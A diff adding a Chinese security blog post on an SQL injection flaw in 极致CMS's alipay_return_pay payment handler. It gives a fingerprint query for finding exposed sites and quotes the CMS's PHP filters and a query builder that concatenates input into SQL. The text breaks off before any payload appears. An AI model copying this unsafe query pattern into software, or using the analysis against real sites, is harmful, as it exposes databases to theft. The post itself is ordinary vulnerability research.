@@ -1,0 +1,948 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>极致CMS alipay_return_pay SQL注入漏洞 - Chinchin&#39;s blog</title><meta name="Description" content="这是我的全新 Hugo 网站"><meta property="og:title" content="极致CMS alipay_return_pay SQL注入漏洞" />
+<meta property="og:description" content="极致CMS alipay_return_pay SQL注入漏洞 漏洞描述 极致CMS支付插件中存在SQL注入漏洞，通过漏洞可以获取数据库信息 漏洞影响 1 极致CMS 网络测绘 1 icon_hash=&#34;1657387632&#34; 漏洞复现" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://example.org/%E6%9E%81%E8%87%B4cms-alipay_return_pay-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" /><meta property="og:image" content="http://example.org/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-12-08T01:08:29+08:00" />
+<meta property="article:modified_time" content="2023-12-08T01:08:29+08:00" /><meta property="og:site_name" content="Chinchin&#39;s blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="http://example.org/logo.png"/>
+
+<meta name="twitter:title" content="极致CMS alipay_return_pay SQL注入漏洞"/>
+<meta name="twitter:description" content="极致CMS alipay_return_pay SQL注入漏洞 漏洞描述 极致CMS支付插件中存在SQL注入漏洞，通过漏洞可以获取数据库信息 漏洞影响 1 极致CMS 网络测绘 1 icon_hash=&#34;1657387632&#34; 漏洞复现"/>
+<meta name="twitter:site" content="@xxxx"/>
+<meta name="application-name" content="Chinchin&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="Chinchin&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/%E6%9E%81%E8%87%B4cms-alipay_return_pay-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" /><link rel="prev" href="http://example.org/%E6%9E%81%E8%87%B4cms-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E7%BC%96%E8%BE%91%E6%8F%92%E4%BB%B6-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" /><link rel="next" href="http://example.org/%E6%9E%81%E8%87%B4cms-1.81-%E5%90%8E%E5%8F%B0%E5%AD%98%E5%82%A8%E5%9E%8Bxss/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "极致CMS alipay_return_pay SQL注入漏洞",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/example.org\/%E6%9E%81%E8%87%B4cms-alipay_return_pay-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E\/"
+        },"genre": "posts","keywords": "漏洞知识库","wordcount":  2642 ,
+        "url": "http:\/\/example.org\/%E6%9E%81%E8%87%B4cms-alipay_return_pay-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E\/","datePublished": "2023-12-08T01:08:29+08:00","dateModified": "2023-12-08T01:08:29+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Chinchin"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Chinchin&#39;s blog"><span id="id-1" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Chinchin&#39;s blog"><span id="id-2" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">极致CMS alipay_return_pay SQL注入漏洞</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Chinchin</a>
+</span>&nbsp;<span class="post-category">included in <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>漏洞知识库</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-12-08">2023-12-08</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;2642 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;6 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="true">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#漏洞描述">漏洞描述</a></li>
+    <li><a href="#漏洞影响">漏洞影响</a></li>
+    <li><a href="#网络测绘">网络测绘</a></li>
+    <li><a href="#漏洞复现">漏洞复现</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="极致cms-alipay_return_pay-sql注入漏洞">极致CMS alipay_return_pay SQL注入漏洞</h1>
+<h2 id="漏洞描述">漏洞描述</h2>
+<p>极致CMS支付插件中存在SQL注入漏洞，通过漏洞可以获取数据库信息</p>
+<h2 id="漏洞影响">漏洞影响</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">极致CMS
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="网络测绘">网络测绘</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">icon_hash=&#34;1657387632&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="漏洞复现">漏洞复现</h2>
+<p>查看一下进行过滤的函数</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="sd">/**
+</span></span></span><span class="line"><span class="cl"><span class="sd">	参数过滤，格式化
+</span></span></span><span class="line"><span class="cl"><span class="sd">**/</span>
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">format_param</span><span class="p">(</span><span class="nv">$value</span><span class="o">=</span><span class="k">null</span><span class="p">,</span><span class="nv">$int</span><span class="o">=</span><span class="mi">0</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="nv">$value</span><span class="o">==</span><span class="k">null</span><span class="p">){</span> <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="p">;}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">switch</span> <span class="p">(</span><span class="nv">$int</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">		<span class="k">case</span> <span class="mi">0</span><span class="o">://</span><span class="nx">整数</span>
+</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="k">case</span> <span class="mi">1</span><span class="o">://</span><span class="nx">字符串</span>
+</span></span><span class="line"><span class="cl">			<span class="nv">$value</span><span class="o">=</span><span class="nx">htmlspecialchars</span><span class="p">(</span><span class="nx">trim</span><span class="p">(</span><span class="nv">$value</span><span class="p">),</span> <span class="nx">ENT_QUOTES</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">			<span class="k">if</span><span class="p">(</span><span class="nx">version_compare</span><span class="p">(</span><span class="k">PHP_VERSION</span><span class="p">,</span><span class="s1">&#39;7.4&#39;</span><span class="p">,</span><span class="s1">&#39;&gt;=&#39;</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">				<span class="nv">$value</span> <span class="o">=</span> <span class="nx">addslashes</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">get_magic_quotes_gpc</span><span class="p">())</span><span class="nv">$value</span> <span class="o">=</span> <span class="nx">addslashes</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">			
+</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="nv">$value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="k">case</span> <span class="mi">2</span><span class="o">://</span><span class="nx">数组</span>
+</span></span><span class="line"><span class="cl">			<span class="k">if</span><span class="p">(</span><span class="nv">$value</span><span class="o">==</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">array_walk_recursive</span><span class="p">(</span><span class="nv">$value</span><span class="p">,</span> <span class="s2">&#34;array_format&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="nv">$value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="k">case</span> <span class="mi">3</span><span class="o">://</span><span class="nx">浮点</span>
+</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="p">(</span><span class="nx">float</span><span class="p">)</span><span class="nv">$value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="k">case</span> <span class="mi">4</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">			<span class="k">if</span><span class="p">(</span><span class="nx">version_compare</span><span class="p">(</span><span class="k">PHP_VERSION</span><span class="p">,</span><span class="s1">&#39;7.4&#39;</span><span class="p">,</span><span class="s1">&#39;&gt;=&#39;</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">				<span class="nv">$value</span> <span class="o">=</span> <span class="nx">addslashes</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">get_magic_quotes_gpc</span><span class="p">())</span><span class="nv">$value</span> <span class="o">=</span> <span class="nx">addslashes</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="nx">trim</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//过滤XSS攻击
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">function</span> <span class="nf">SafeFilter</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$arr</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">   <span class="nv">$ra</span><span class="o">=</span><span class="k">Array</span><span class="p">(</span><span class="s1">&#39;/([\x00-\x08,\x0b-\x0c,\x0e-\x19])/&#39;</span><span class="p">,</span><span class="s1">&#39;/script/&#39;</span><span class="p">,</span><span class="s1">&#39;/javascript/&#39;</span><span class="p">,</span><span class="s1">&#39;/vbscript/&#39;</span><span class="p">,</span><span class="s1">&#39;/expression/&#39;</span><span class="p">,</span><span class="s1">&#39;/applet/&#39;</span>
+</span></span><span class="line"><span class="cl">   <span class="p">,</span><span class="s1">&#39;/meta/&#39;</span><span class="p">,</span><span class="s1">&#39;/xml/&#39;</span><span class="p">,</span><span class="s1">&#39;/blink/&#39;</span><span class="p">,</span><span class="s1">&#39;/link/&#39;</span><span class="p">,</span><span class="s1">&#39;/style/&#39;</span><span class="p">,</span><span class="s1">&#39;/embed/&#39;</span><span class="p">,</span><span class="s1">&#39;/object/&#39;</span><span class="p">,</span><span class="s1">&#39;/frame/&#39;</span><span class="p">,</span><span class="s1">&#39;/layer/&#39;</span><span class="p">,</span><span class="s1">&#39;/title/&#39;</span><span class="p">,</span><span class="s1">&#39;/bgsound/&#39;</span>
+</span></span><span class="line"><span class="cl">   <span class="p">,</span><span class="s1">&#39;/base/&#39;</span><span class="p">,</span><span class="s1">&#39;/onload/&#39;</span><span class="p">,</span><span class="s1">&#39;/onunload/&#39;</span><span class="p">,</span><span class="s1">&#39;/onchange/&#39;</span><span class="p">,</span><span class="s1">&#39;/onsubmit/&#39;</span><span class="p">,</span><span class="s1">&#39;/onreset/&#39;</span><span class="p">,</span><span class="s1">&#39;/onselect/&#39;</span><span class="p">,</span><span class="s1">&#39;/onblur/&#39;</span><span class="p">,</span><span class="s1">&#39;/onfocus/&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">   <span class="s1">&#39;/onabort/&#39;</span><span class="p">,</span><span class="s1">&#39;/onkeydown/&#39;</span><span class="p">,</span><span class="s1">&#39;/onkeypress/&#39;</span><span class="p">,</span><span class="s1">&#39;/onkeyup/&#39;</span><span class="p">,</span><span class="s1">&#39;/onclick/&#39;</span><span class="p">,</span><span class="s1">&#39;/ondblclick/&#39;</span><span class="p">,</span><span class="s1">&#39;/onmousedown/&#39;</span><span class="p">,</span><span class="s1">&#39;/onmousemove/&#39;</span>
+</span></span><span class="line"><span class="cl">   <span class="p">,</span><span class="s1">&#39;/onmouseout/&#39;</span><span class="p">,</span><span class="s1">&#39;/onmouseover/&#39;</span><span class="p">,</span><span class="s1">&#39;/onmouseup/&#39;</span><span class="p">,</span><span class="s1">&#39;/onunload/&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">     
+</span></span><span class="line"><span class="cl">   <span class="k">if</span> <span class="p">(</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$arr</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">   <span class="p">{</span>
+</span></span><span class="line"><span class="cl">     <span class="k">foreach</span> <span class="p">(</span><span class="nv">$arr</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">     <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$value</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nx">version_compare</span><span class="p">(</span><span class="k">PHP_VERSION</span><span class="p">,</span><span class="s1">&#39;7.4&#39;</span><span class="p">,</span><span class="s1">&#39;&gt;=&#39;</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">				<span class="nv">$value</span>  <span class="o">=</span> <span class="nx">addslashes</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">			<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">get_magic_quotes_gpc</span><span class="p">()){</span>
+</span></span><span class="line"><span class="cl">					<span class="nv">$value</span>  <span class="o">=</span> <span class="nx">addslashes</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">				<span class="p">}</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">          <span class="nv">$value</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="nv">$ra</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$value</span><span class="p">);</span>     <span class="c1">//删除非打印字符，粗暴式过滤xss可疑字符串
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>          <span class="nv">$arr</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span>     <span class="o">=</span> <span class="nx">htmlentities</span><span class="p">(</span><span class="nx">strip_tags</span><span class="p">(</span><span class="nv">$value</span><span class="p">));</span> <span class="c1">//去除 HTML 和 PHP 标记并转换为 HTML 实体
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="nx">SafeFilter</span><span class="p">(</span><span class="nv">$arr</span><span class="p">[</span><span class="nv">$key</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">     <span class="p">}</span>
+</span></span><span class="line"><span class="cl">   <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>看一下执行的SQL语句的函数</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"> <span class="c1">// 查询一条
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">public</span> <span class="k">function</span> <span class="nf">find</span><span class="p">(</span><span class="nv">$where</span><span class="o">=</span><span class="k">null</span><span class="p">,</span><span class="nv">$order</span><span class="o">=</span><span class="k">null</span><span class="p">,</span><span class="nv">$fields</span><span class="o">=</span><span class="k">null</span><span class="p">,</span><span class="nv">$limit</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	   <span class="k">if</span><span class="p">(</span> <span class="nv">$record</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">findAll</span><span class="p">(</span><span class="nv">$where</span><span class="p">,</span> <span class="nv">$order</span><span class="p">,</span> <span class="nv">$fields</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="p">){</span>
+</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="nx">array_pop</span><span class="p">(</span><span class="nv">$record</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="k">FALSE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>跟进 findAll 函数</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// 查询所有
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">public</span> <span class="k">function</span> <span class="nf">findAll</span><span class="p">(</span><span class="nv">$conditions</span><span class="o">=</span><span class="k">null</span><span class="p">,</span><span class="nv">$order</span><span class="o">=</span><span class="k">null</span><span class="p">,</span><span class="nv">$fields</span><span class="o">=</span><span class="k">null</span><span class="p">,</span><span class="nv">$limit</span><span class="o">=</span><span class="k">null</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$where</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$conditions</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">			<span class="nv">$join</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">			<span class="k">foreach</span><span class="p">(</span> <span class="nv">$conditions</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span> <span class="p">){</span>
+</span></span><span class="line"><span class="cl">				<span class="nv">$value</span> <span class="o">=</span>  <span class="s1">&#39;\&#39;&#39;</span><span class="o">.</span><span class="nv">$value</span><span class="o">.</span><span class="s1">&#39;\&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">				<span class="nv">$join</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="si">{</span><span class="nv">$key</span><span class="si">}</span><span class="s2"> = </span><span class="si">{</span><span class="nv">$value</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">			<span class="nv">$where</span> <span class="o">=</span> <span class="s2">&#34;WHERE &#34;</span><span class="o">.</span><span class="nx">join</span><span class="p">(</span><span class="s2">&#34; AND &#34;</span><span class="p">,</span><span class="nv">$join</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="k">if</span><span class="p">(</span><span class="k">null</span> <span class="o">!=</span> <span class="nv">$conditions</span><span class="p">)</span><span class="nv">$where</span> <span class="o">=</span> <span class="s2">&#34;WHERE &#34;</span><span class="o">.</span><span class="nv">$conditions</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span><span class="p">(</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$order</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">       		<span class="nv">$where</span> <span class="o">.=</span> <span class="s1">&#39; ORDER BY &#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$where</span> <span class="o">.=</span> <span class="nx">implode</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span> <span class="nv">$order</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">         <span class="k">if</span><span class="p">(</span><span class="nv">$order</span><span class="o">!=</span><span class="k">null</span><span class="p">)</span><span class="nv">$where</span> <span class="o">.=</span> <span class="s2">&#34; ORDER BY  &#34;</span><span class="o">.</span><span class="nv">$order</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">		
+</span></span><span class="line"><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$limit</span><span class="p">))</span><span class="nv">$where</span> <span class="o">.=</span> <span class="s2">&#34; LIMIT </span><span class="si">{</span><span class="nv">$limit</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">;</span>
